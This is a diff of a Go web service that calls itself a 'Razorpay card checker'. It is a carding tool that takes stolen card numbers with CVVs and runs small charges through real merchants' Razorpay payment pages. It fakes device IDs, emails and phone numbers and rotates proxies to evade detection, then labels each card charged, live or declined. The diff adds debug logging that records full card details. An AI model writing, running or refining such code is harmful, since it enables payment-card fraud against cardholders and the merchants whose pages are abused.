@@ -1,4 +1,3 @@
-
 package main
 
 import (
@@ -24,8 +23,6 @@ import (
     "time"
 )
 
-
-
 const (
     BUILD    = "9cb57fdf457e44eac4384e182f925070ff5488d9"
     BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
@@ -34,33 +31,35 @@ const (
 
 var (
     razorpayURLs = []string{
-            "https://pages.razorpay.com/elite-pay",
-
-
-        
-        
-        
-           
-        
-        
-        
+        "https://pages.razorpay.com/elite-pay",
+        "https://pages.razorpay.com/mitzvahpay",
+        "https://pages.razorpay.com/yogapremium",
     }
     urlIndex   uint64
     proxyIndex uint64
+    debugMode  = true // Enable debug logging
 )
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
+func logDebug(format string, args ...interface{}) {
+    if debugMode {
+        log.Printf("[DEBUG] "+format, args...)
+    }
+}
+
+func logError(format string, args ...interface{}) {
+    log.Printf("[ERROR] "+format, args...)
+}
+
+func logSuccess(format string, args ...interface{}) {
+    log.Printf("[SUCCESS] "+format, args...)
+}
 
 func getNextURL() string {
     idx := atomic.AddUint64(&urlIndex, 1) - 1
-    return razorpayURLs[idx%uint64(len(razorpayURLs))]
+    selected := razorpayURLs[idx%uint64(len(razorpayURLs))]
+    logDebug("Selected URL #%d: %s", idx%uint64(len(razorpayURLs)), selected)
+    return selected
 }
-
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
 
 func formatProxy(raw string) string {
     raw = strings.TrimSpace(raw)
@@ -81,6 +80,7 @@ func loadProxies(filepath string) []string {
     var proxies []string
     data, err := os.ReadFile(filepath)
     if err != nil {
+        logDebug("No proxy file found: %v", err)
         return proxies
     }
     lines := strings.Split(string(data), "\n")
@@ -94,23 +94,30 @@ func loadProxies(filepath string) []string {
             proxies = append(proxies, formatted)
         }
     }
+    logDebug("Loaded %d proxies from %s", len(proxies), filepath)
     return proxies
 }
 
 func getNextProxy(proxyList []string) string {
-    return ""
-
-    
     if len(proxyList) == 0 {
         return ""
     }
     idx := atomic.AddUint64(&proxyIndex, 1) - 1
-    return proxyList[idx%uint64(len(proxyList))]
+    selected := proxyList[idx%uint64(len(proxyList))]
+    logDebug("Selected proxy #%d: %s", idx%uint64(len(proxyList)), maskProxy(selected))
+    return selected
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
+func maskProxy(proxyURL string) string {
+    if proxyURL == "" {
+        return "DIRECT"
+    }
+    parsed, err := url.Parse(proxyURL)
+    if err == nil && parsed.Host != "" {
+        return parsed.Host
+    }
+    return "PROXY"
+}
 
 func randInt(min, max int) int {
     n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
@@ -169,9 +176,7 @@ func findBetween(content, start, end string) string {
     return content[si : si+ei]
 }
 
-// extractJSONVar uses brace counting instead of regex — Go's RE2 does NOT
-// backtrack like PHP's PCRE, so `[\s\S]*?` stops at the first `}` (which is
-// inside a nested object), producing truncated/corrupt JSON.
+// extractJSONVar uses brace counting instead of regex
 func extractJSONVar(content, varName string) string {
     prefix := "var " + varName + " ="
     startIdx := strings.Index(content, prefix)
@@ -247,10 +252,6 @@ func generateRzpSessionID() string {
     return string(buf)
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
 type FetchResponse struct {
     Body       string
     StatusCode int
@@ -293,12 +294,15 @@ func NewCustomFetch(proxyURL, ua string) (*CustomFetch, error) {
             return nil, fmt.Errorf("invalid proxy url: %w", err)
         }
         transport.Proxy = http.ProxyURL(parsed)
+        logDebug("Using proxy: %s", maskProxy(proxyURL))
+    } else {
+        logDebug("Using direct connection (no proxy)")
     }
 
     client := &http.Client{
         Transport: transport,
         Jar:       jar,
-        Timeout:   30 * time.Second,
+        Timeout:   45 * time.Second,
         CheckRedirect: func(req *http.Request, via []*http.Request) error {
             if len(via) >= 5 {
                 return errors.New("too many redirects")
@@ -332,8 +336,10 @@ func (f *CustomFetch) DoFetch(targetURL string, method string, headers map[strin
         req.Header.Set(k, v)
     }
 
+    logDebug("Request: %s %s", method, targetURL)
     resp, err := f.client.Do(req)
     if err != nil {
+        logError("Request failed: %v", err)
         return nil, err
     }
     defer resp.Body.Close()
@@ -343,11 +349,23 @@ func (f *CustomFetch) DoFetch(targetURL string, method string, headers map[strin
         return nil, err
     }
 
+    logDebug("Response status: %d, body length: %d", resp.StatusCode, len(respBody))
+    if resp.StatusCode != 200 {
+        logDebug("Response body (first 500 chars): %s", string(respBody[:min(500, len(respBody))]))
+    }
+
     return &FetchResponse{
         Body:       string(respBody),
         StatusCode: resp.StatusCode,
         Headers:    resp.Header,
     }, nil
+}
+
+func min(a, b int) int {
+    if a < b {
+        return a
+    }
+    return b
 }
 
 func (f *CustomFetch) Get(targetURL string, headers map[string]string) (*FetchResponse, error) {
@@ -369,6 +387,7 @@ func (f *CustomFetch) PostJSON(targetURL string, headers map[string]string, payl
             }
         }
     }
+    logDebug("POST JSON to: %s", targetURL)
     return f.DoFetch(targetURL, "POST", headers, strings.NewReader(string(jsonBytes)))
 }
 
@@ -383,12 +402,9 @@ func (f *CustomFetch) PostForm(targetURL string, headers map[string]string, form
             }
         }
     }
+    logDebug("POST Form to: %s", targetURL)
     return f.DoFetch(targetURL, "POST", headers, strings.NewReader(formData.Encode()))
 }
-
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
 
 type CheckResult struct {
     Status      string `json:"status"`
@@ -397,11 +413,12 @@ type CheckResult struct {
     ProxyStatus string `json:"proxy_status"`
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
 func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
+    logDebug("========== STARTING CARD CHECK ==========")
+    logDebug("Card: %s|%s|%s|%s", cc[:6]+"******", mm, yy, cvv)
+    logDebug("Target URL: %s", targetURL)
+    logDebug("Proxy: %s", proxyURL)
+
     yy2 := yy
     if len(yy) == 4 {
         yy2 = yy[2:]
@@ -413,39 +430,49 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
     phoneShort := phone[3:]
     email := genEmail()
 
+    logDebug("Generated: brand=%s, phone=%s, email=%s", brand, phone, email)
+
     rzpDeviceID, fhash := generateRzpDeviceID()
     rzpSessionID := generateRzpSessionID()
 
+    logDebug("DeviceID: %s, SessionID: %s", rzpDeviceID, rzpSessionID)
+
     fetch, err := NewCustomFetch(proxyURL, ua)
     if err != nil {
+        logError("Failed to create fetch client: %v", err)
         return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyURL, ProxyStatus: "DEAD"}
     }
     defer fetch.client.CloseIdleConnections()
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
+    // ============ STEP 1: Get Payment Page ============
+    logDebug("STEP 1: Fetching payment page...")
     r1, err := fetch.Get(targetURL, map[string]string{
         "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept-Language": "en-US,en;q=0.5",
     })
     if err != nil {
+        logError("Failed to fetch payment page: %v", err)
         return makeProxyError(err, proxyURL)
     }
     r1Text := r1.Text()
+    logDebug("Page fetched: %d bytes", len(r1Text))
 
-    // Use brace-counting parser instead of regex
+    // ============ STEP 2: Extract JSON Data ============
+    logDebug("STEP 2: Extracting JSON data...")
     jsonStr := extractJSONVar(r1Text, "data")
     if jsonStr == "" {
+        logError("Failed to extract JSON data from page")
         return CheckResult{Status: "error", Message: "Failed to locate Razorpay data on page", Proxy: proxyURL, ProxyStatus: "LIVE"}
     }
+    logDebug("Extracted JSON length: %d", len(jsonStr))
 
     var initData map[string]interface{}
     if err := json.Unmarshal([]byte(jsonStr), &initData); err != nil {
+        logError("Failed to parse JSON: %v", err)
         var inner string
         if err2 := json.Unmarshal([]byte(jsonStr), &inner); err2 == nil {
             if err3 := json.Unmarshal([]byte(inner), &initData); err3 != nil {
+                logError("Failed to parse inner JSON: %v", err3)
                 return CheckResult{Status: "error", Message: "Failed to parse Razorpay JSON data", Proxy: proxyURL, ProxyStatus: "LIVE"}
             }
         } else {
@@ -458,12 +485,13 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         kyid = getStringFromMap(initData, "key")
     }
     if kyid == "" {
+        logError("Key ID not found in JSON data")
         return CheckResult{Status: "error", Message: "Razorpay Key ID not found", Proxy: proxyURL, ProxyStatus: "LIVE"}
     }
+    logDebug("Key ID: %s", kyid)
 
     var plink, ppid string
-    // Force 1 INR (100 paise) — never use 0 from potentially missing JSON fields
-    const forceAmount float64 = 10000
+    const forceAmount float64 = 100
 
     if plObj, ok := initData["payment_link"].(map[string]interface{}); ok {
         plink = getStringFromMap(plObj, "id")
@@ -482,16 +510,17 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
     }
 
     if plink == "" {
+        logError("Payment Link ID not found")
         return CheckResult{Status: "error", Message: "Payment Link ID not found in page structure", Proxy: proxyURL, ProxyStatus: "LIVE"}
     }
+    logDebug("Payment Link: %s, Page Item: %s", plink, ppid)
 
     keylessHeader := getStringFromMap(initData, "keyless_header")
     keylessHeaderURL := url.QueryEscape(keylessHeader)
+    logDebug("Keyless Header: %s", keylessHeader)
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
+    // ============ STEP 3: Create Order ============
+    logDebug("STEP 3: Creating order...")
     r2Payload := map[string]interface{}{
         "notes":      map[string]string{"comment": "", "name": "User"},
         "line_items": []map[string]interface{}{{"payment_page_item_id": ppid, "amount": forceAmount}},
@@ -508,11 +537,13 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         r2Payload,
     )
     if err != nil {
+        logError("Order creation failed: %v", err)
         return makeProxyError(err, proxyURL)
     }
 
     var r2Data map[string]interface{}
     if err := json.Unmarshal([]byte(r2.Text()), &r2Data); err != nil {
+        logError("Order response parse failed: %v, body: %s", err, r2.Text())
         return CheckResult{Status: "error", Message: "Order response parse failed: " + truncate(err.Error(), 80), Proxy: proxyURL, ProxyStatus: "LIVE"}
     }
 
@@ -526,13 +557,16 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
                 errMsg = desc
             }
         }
+        logError("Order creation failed: %s", errMsg)
         return CheckResult{Status: "error", Message: errMsg, Proxy: proxyURL, ProxyStatus: "LIVE"}
     }
+    logSuccess("Order created: %s", orderID)
 
     checkoutID := orderID
     if idx := strings.Index(orderID, "_"); idx != -1 {
         checkoutID = orderID[idx+1:]
     }
+    logDebug("Checkout ID: %s", checkoutID)
 
     orderAmount := getFloatFromMap(orderObj, "amount")
     if orderAmount < 100 {
@@ -542,11 +576,10 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
     if orderCurrency == "" {
         orderCurrency = "INR"
     }
+    logDebug("Order Amount: %.0f %s", orderAmount, orderCurrency)
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
+    // ============ STEP 4: Get Session Token ============
+    logDebug("STEP 4: Getting session token...")
     params3 := url.Values{
         "traffic_env":        {"production"},
         "build":              {BUILD},
@@ -566,6 +599,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         },
     )
     if err != nil {
+        logError("Session token fetch failed: %v", err)
         return makeProxyError(err, proxyURL)
     }
     r3Text := r3.Text()
@@ -579,8 +613,10 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         }
     }
     if sessid == "" {
+        logError("Session token not found in response")
         return CheckResult{Status: "error", Message: "Session token not found", Proxy: proxyURL, ProxyStatus: "LIVE"}
     }
+    logSuccess("Session token obtained: %s...", sessid[:20])
 
     rzpRef := fmt.Sprintf("https://api.razorpay.com/v1/checkout/public?traffic_env=production&build=%s&build_v1=%s&checkout_v2=1&new_session=1&unified_session_id=%s&session_token=%s",
         BUILD, BUILD_V1, rzpSessionID, sessid)
@@ -594,10 +630,8 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         }
     }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
+    // ============ STEP 5: Preferences ============
+    logDebug("STEP 5: Setting preferences...")
     {
         resources := []string{"checkout_version_config", "merchant", "merchant_features", "downtime", "customer", "customer_tokens", "truecaller", "methods", "experiments", "offers", "checkout_config", "order", "invoice", "buyer_protection", "personalization"}
         queryArr := make([]map[string]string, 0, len(resources))
@@ -626,16 +660,19 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
 
         h := stdHeaders()
         h["Content-Type"] = "application/json"
-        fetch.PostJSON(
+        r4, err := fetch.PostJSON(
             fmt.Sprintf("https://api.razorpay.com/v2/standard_checkout/preferences?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeader),
             h, r4Payload,
         )
+        if err != nil {
+            logDebug("Preferences request failed (non-critical): %v", err)
+        } else {
+            logDebug("Preferences response status: %d", r4.StatusCode)
+        }
     }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
+    // ============ STEP 6: Checkout Order ============
+    logDebug("STEP 6: Checkout order...")
     {
         form5 := url.Values{
             "notes[email]":          {email},
@@ -670,16 +707,19 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
 
         h := stdHeaders()
         h["Content-Type"] = "application/x-www-form-urlencoded"
-        fetch.PostForm(
+        r5, err := fetch.PostForm(
             fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/checkout/order?key_id=%s&session_token=%s&keyless_header=%s", kyid, sessid, keylessHeader),
             h, form5,
         )
+        if err != nil {
+            logDebug("Checkout order failed (non-critical): %v", err)
+        } else {
+            logDebug("Checkout order response status: %d", r5.StatusCode)
+        }
     }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
+    // ============ STEP 7: CB Flows ============
+    logDebug("STEP 7: CB flows...")
     {
         r6Payload := map[string]interface{}{
             "identifiers": map[string]interface{}{
@@ -697,16 +737,19 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
 
         h := stdHeaders()
         h["Content-Type"] = "application/json"
-        fetch.PostJSON(
+        r6, err := fetch.PostJSON(
             fmt.Sprintf("https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id=%s&keyless_header=%s", orderID, keylessHeaderURL),
             h, r6Payload,
         )
+        if err != nil {
+            logDebug("CB flows failed (non-critical): %v", err)
+        } else {
+            logDebug("CB flows response status: %d", r6.StatusCode)
+        }
     }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
+    // ============ STEP 8: Create Payment ============
+    logDebug("STEP 8: Creating payment...")
     tokenCreate := base64.StdEncoding.EncodeToString([]byte(`[{"name":"sardine","metadata":{"session_id":"` + checkoutID + `"}}]`))
 
     form7 := url.Values{
@@ -756,11 +799,17 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         form7,
     )
     if err != nil {
+        logError("Payment creation failed: %v", err)
         return makeProxyError(err, proxyURL)
     }
 
+    logDebug("Payment creation response status: %d", r7.StatusCode)
+    logDebug("Payment creation response body (first 500): %s", r7.Text()[:min(500, len(r7.Text()))])
+
     var r7Data map[string]interface{}
     if err := json.Unmarshal([]byte(r7.Text()), &r7Data); err != nil {
+        logError("Payment create response parse failed: %v", err)
+        logError("Raw response: %s", r7.Text())
         return CheckResult{Status: "error", Message: "Payment create response parse failed", Proxy: proxyURL, ProxyStatus: "LIVE"}
     }
 
@@ -775,34 +824,55 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         errDesc = strings.ReplaceAll(errDesc, " Try another payment method or contact your bank for details.", "")
         errDesc = strings.TrimSpace(errDesc)
         errCode := getStringFromMap(errObj, "reason")
+        errField := getStringFromMap(errObj, "field")
 
         label := errDesc
         if errCode != "" {
             label = errDesc + " (" + errCode + ")"
         }
+        if label == "" {
+            label = "Unknown Decline"
+        }
+
+        logDebug("Payment failed: code=%s, field=%s, desc=%s", errCode, errField, errDesc)
 
         msgLower := strings.ToLower(errDesc)
         if isBalanceKeyword(msgLower) || isCVVKeyword(msgLower, errCode) {
+            logSuccess("Card is LIVE (Insufficient Funds or CVV error): %s", label)
             return CheckResult{Status: "approved", Message: label, Proxy: proxyURL, ProxyStatus: "LIVE"}
         }
+
+        // Check if it's a decline
+        if strings.Contains(strings.ToLower(errDesc), "declined") || errCode == "card_declined" {
+            logDebug("Card was DECLINED: %s", label)
+            return CheckResult{Status: "declined", Message: label, Proxy: proxyURL, ProxyStatus: "LIVE"}
+        }
+
+        // Default: treat as declined
+        logDebug("Unknown error - treating as DECLINED: %s", label)
         return CheckResult{Status: "declined", Message: label, Proxy: proxyURL, ProxyStatus: "LIVE"}
     }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
+    logSuccess("Payment created: %s", paymentID)
 
+    // ============ STEP 9: 3DS Authentication ============
+    logDebug("STEP 9: 3DS authentication...")
     pidClean := paymentID
     if idx := strings.Index(paymentID, "_"); idx != -1 {
         pidClean = paymentID[idx+1:]
     }
 
     {
-        fetch.PostForm(
+        r8, err := fetch.PostForm(
             fmt.Sprintf("https://api.razorpay.com/pg_router/v1/payments/%s/authenticate", paymentID),
             map[string]string{"content-type": "application/x-www-form-urlencoded"},
             url.Values{},
         )
+        if err != nil {
+            logDebug("3DS auth 1 failed (non-critical): %v", err)
+        } else {
+            logDebug("3DS auth 1 response status: %d", r8.StatusCode)
+        }
     }
 
     time.Sleep(1 * time.Second)
@@ -824,18 +894,21 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
             "auth_step":                   {"3ds2Auth"},
         }
 
-        fetch.PostForm(
+        r9, err := fetch.PostForm(
             fmt.Sprintf("https://api.razorpay.com/pg_router/v1/payments/%s/authenticate", pidClean),
             map[string]string{"content-type": "application/x-www-form-urlencoded"},
             form8,
         )
+        if err != nil {
+            logDebug("3DS auth 2 failed (non-critical): %v", err)
+        } else {
+            logDebug("3DS auth 2 response status: %d", r9.StatusCode)
+        }
     }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
-    r9, err := fetch.Get(
+    // ============ STEP 10: Get Final Result ============
+    logDebug("STEP 10: Getting final result...")
+    r10, err := fetch.Get(
         fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/%s/cancel?key_id=%s&session_token=%s&keyless_header=%s", paymentID, kyid, sessid, keylessHeader),
         map[string]string{
             "Accept":          "*/*",
@@ -845,21 +918,33 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         },
     )
     if err != nil {
+        logError("Final result fetch failed: %v", err)
         return makeProxyError(err, proxyURL)
     }
 
-    var r9Data map[string]interface{}
-    if err := json.Unmarshal([]byte(r9.Text()), &r9Data); err != nil {
+    logDebug("Final response status: %d", r10.StatusCode)
+    logDebug("Final response body (first 500): %s", r10.Text()[:min(500, len(r10.Text()))])
+
+    var r10Data map[string]interface{}
+    if err := json.Unmarshal([]byte(r10.Text()), &r10Data); err != nil {
+        logError("Final response parse failed: %v", err)
         return CheckResult{Status: "declined", Message: "Cancel response parse failed", Proxy: proxyURL, ProxyStatus: "LIVE"}
     }
 
-    finalText := r9.Text()
+    finalText := r10.Text()
 
+    // Check for successful charge
     if strings.Contains(finalText, "razorpay_payment_id") {
-        return CheckResult{Status: "charged", Message: "Payment Successful", Proxy: proxyURL, ProxyStatus: "LIVE"}
+        pid := getStringFromMap(r10Data, "razorpay_payment_id")
+        if pid == "" {
+            pid = paymentID
+        }
+        logSuccess("PAYMENT CHARGED SUCCESSFULLY! Payment ID: %s", pid)
+        return CheckResult{Status: "charged", Message: fmt.Sprintf("Charged ₹%.0f | %s", orderAmount/100, pid), Proxy: proxyURL, ProxyStatus: "LIVE"}
     }
 
-    errorObj, _ := r9Data["error"].(map[string]interface{})
+    // Parse error from final response
+    errorObj, _ := r10Data["error"].(map[string]interface{})
     errorDesc := getStringFromMap(errorObj, "description")
     errorDesc = strings.ReplaceAll(errorDesc, " Try another payment method or contact your bank for details.", "")
     errorDesc = strings.TrimSpace(errorDesc)
@@ -873,17 +958,38 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         label = "Unknown Decline"
     }
 
+    logDebug("Final result: desc=%s, code=%s", errorDesc, errCode)
+
     msgLower := strings.ToLower(errorDesc)
-    if isBalanceKeyword(msgLower) || isCVVKeyword(msgLower, errCode) {
+
+    // Check for live card indicators
+    if isBalanceKeyword(msgLower) {
+        logSuccess("Card is LIVE - Insufficient Funds: %s", label)
         return CheckResult{Status: "approved", Message: label, Proxy: proxyURL, ProxyStatus: "LIVE"}
     }
 
+    if isCVVKeyword(msgLower, errCode) {
+        logSuccess("Card is LIVE - CVV Error: %s", label)
+        return CheckResult{Status: "approved", Message: label, Proxy: proxyURL, ProxyStatus: "LIVE"}
+    }
+
+    // Check for 3D Secure
+    if strings.Contains(msgLower, "3d") || strings.Contains(msgLower, "3ds") ||
+        strings.Contains(msgLower, "secure") || strings.Contains(msgLower, "authentication") {
+        logDebug("3D Secure required")
+        return CheckResult{Status: "declined", Message: "3D Secure required - Authentication needed", Proxy: proxyURL, ProxyStatus: "LIVE"}
+    }
+
+    // Check if it's a decline
+    if strings.Contains(msgLower, "declined") || errCode == "card_declined" {
+        logDebug("Card was DECLINED: %s", label)
+        return CheckResult{Status: "declined", Message: label, Proxy: proxyURL, ProxyStatus: "LIVE"}
+    }
+
+    // Default: treat as declined
+    logDebug("Unknown final status - treating as DECLINED: %s", label)
     return CheckResult{Status: "declined", Message: label, Proxy: proxyURL, ProxyStatus: "LIVE"}
 }
-
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
 
 func getStringFromMap(m map[string]interface{}, key string) string {
     if m == nil {
@@ -983,29 +1089,15 @@ func makeProxyError(err error, proxyURL string) CheckResult {
     return CheckResult{Status: "error", Message: msg, Proxy: proxyURL, ProxyStatus: status}
 }
 
-func maskProxy(proxyURL, proxyStatus string) string {
-    if proxyURL == "" {
-        return "DIRECT [" + proxyStatus + "]"
-    }
-    parsed, err := url.Parse(proxyURL)
-    if err == nil && parsed.Host != "" {
-        return parsed.Scheme + "//" + parsed.Host + " [" + proxyStatus + "]"
-    }
-    masked := regexp.MustCompile(`//[^@]+@`).ReplaceAllString(proxyURL, "//***@")
-    return masked + " [" + proxyStatus + "]"
-}
-
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
 type ParsedCard struct {
     CC, MM, YY, CVV string
 }
 
 func parseCard(cardData string) (*ParsedCard, error) {
     cardData = strings.TrimSpace(cardData)
-    separators := []string{"|", "/", " "}
+    logDebug("Parsing card: %s", cardData)
+
+    separators := []string{"|", "/", " ", ","}
 
     for _, sep := range separators {
         parts := strings.Split(cardData, sep)
@@ -1015,9 +1107,12 @@ func parseCard(cardData string) (*ParsedCard, error) {
             yy := strings.TrimSpace(parts[2])
             cvv := strings.TrimSpace(parts[3])
 
+            logDebug("Trying separator '%s': cc=%s, mm=%s, yy=%s, cvv=%s", sep, cc, mm, yy, cvv)
+
             if isDigits(cc) && isDigitsMM(mm) && isDigitsYY(yy) && isDigitsCVV(cvv) {
                 mmInt, _ := strconv.Atoi(mm)
                 if len(cc) >= 13 && len(cc) <= 19 && mmInt >= 1 && mmInt <= 12 {
+                    logSuccess("Card parsed successfully: %s|%s|%s|%s", cc[:6]+"******", mm, yy, cvv)
                     return &ParsedCard{
                         CC:  cc,
                         MM:  fmt.Sprintf("%02d", mmInt),
@@ -1025,10 +1120,22 @@ func parseCard(cardData string) (*ParsedCard, error) {
                         CVV: cvv,
                     }, nil
                 }
+                logDebug("Card validation failed: cc_len=%d, mm=%d", len(cc), mmInt)
             }
         }
     }
-    return nil, errors.New("invalid card format")
+
+    // Try as URL-encoded format
+    if strings.Contains(cardData, "%7C") {
+        decoded, err := url.QueryUnescape(cardData)
+        if err == nil && decoded != cardData {
+            logDebug("URL-decoded card: %s", decoded)
+            return parseCard(decoded)
+        }
+    }
+
+    logError("Failed to parse card: %s", cardData)
+    return nil, errors.New("invalid card format: must be cc|mm|yy|cvv")
 }
 
 func isDigits(s string) bool {
@@ -1051,10 +1158,6 @@ func isDigitsYY(s string) bool {
 func isDigitsCVV(s string) bool {
     return isDigits(s) && (len(s) == 3 || len(s) == 4)
 }
-
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
 
 func logLive(card *ParsedCard, result CheckResult) {
     if result.Status == "charged" || result.Status == "approved" {
@@ -1086,18 +1189,19 @@ func logResult(card *ParsedCard, result CheckResult, proxyDisplay, targetURL str
         result.Message, proxyDisplay, targetURL)
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
 func handler(w http.ResponseWriter, r *http.Request) {
     w.Header().Set("Content-Type", "application/json")
+
+    logDebug("========================================")
+    logDebug("Received request: %s %s", r.Method, r.URL.Path)
+    logDebug("Remote addr: %s", r.RemoteAddr)
 
     path := r.URL.Path
     re := regexp.MustCompile(`^/razorpay/cc=(.+)$`)
     match := re.FindStringSubmatch(path)
 
     if len(match) < 2 {
+        logError("Invalid endpoint requested: %s", path)
         w.WriteHeader(http.StatusNotFound)
         json.NewEncoder(w).Encode(map[string]string{
             "status":   "error",
@@ -1108,12 +1212,15 @@ func handler(w http.ResponseWriter, r *http.Request) {
     }
 
     cardData, _ := url.QueryUnescape(match[1])
+    logDebug("Card data from URL: %s", cardData)
+
     card, err := parseCard(cardData)
     if err != nil {
+        logError("Card parse error: %v", err)
         w.WriteHeader(http.StatusBadRequest)
         json.NewEncoder(w).Encode(map[string]string{
             "status":   "error",
-            "response": "Invalid card format. Use: cc|mm|yy|cvv",
+            "response": err.Error(),
             "proxy":    "N/A",
         })
         return
@@ -1123,9 +1230,11 @@ func handler(w http.ResponseWriter, r *http.Request) {
     proxy := getNextProxy(proxyList)
     targetURL := getNextURL()
 
+    logDebug("Starting check for card: %s|%s|%s|%s", card.CC[:6]+"******", card.MM, card.YY, card.CVV)
+
     result := checkCard(card.CC, card.MM, card.YY, card.CVV, proxy, targetURL)
 
-    proxyDisplay := maskProxy(result.Proxy, result.ProxyStatus)
+    proxyDisplay := maskProxy(result.Proxy) + " [" + result.ProxyStatus + "]"
     logLive(card, result)
     logResult(card, result, proxyDisplay, targetURL)
 
@@ -1136,35 +1245,31 @@ func handler(w http.ResponseWriter, r *http.Request) {
     }
 
     if result.Status == "error" {
+        logError("Returning error response: %s", result.Message)
         w.WriteHeader(http.StatusInternalServerError)
     } else {
+        logSuccess("Returning response: status=%s, message=%s", result.Status, result.Message)
         w.WriteHeader(http.StatusOK)
     }
     json.NewEncoder(w).Encode(resp)
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
 func main() {
-    log.SetFlags(log.Ldate | log.Ltime)
+    log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
 
     http.HandleFunc("/", handler)
 
     addr := fmt.Sprintf("0.0.0.0:%d", PORT)
     log.Printf("=========================================================")
-    log.Printf("  RAZORPAY CARD CHECKER - GO VERSION")
+    log.Printf("  RAZORPAY CARD CHECKER - GO VERSION (DEBUG ENABLED)")
     log.Printf("  Listening on: http://%s", addr)
     log.Printf("  Endpoint: /razorpay/cc={cc|mm|yy|cvv}")
+    log.Printf("=========================================================")
+    log.Printf("  DEBUG MODE: ENABLED")
+    log.Printf("  All requests will be logged in detail")
     log.Printf("=========================================================")
 
     if err := http.ListenAndServe(addr, nil); err != nil {
         log.Fatalf("Server failed: %v", err)
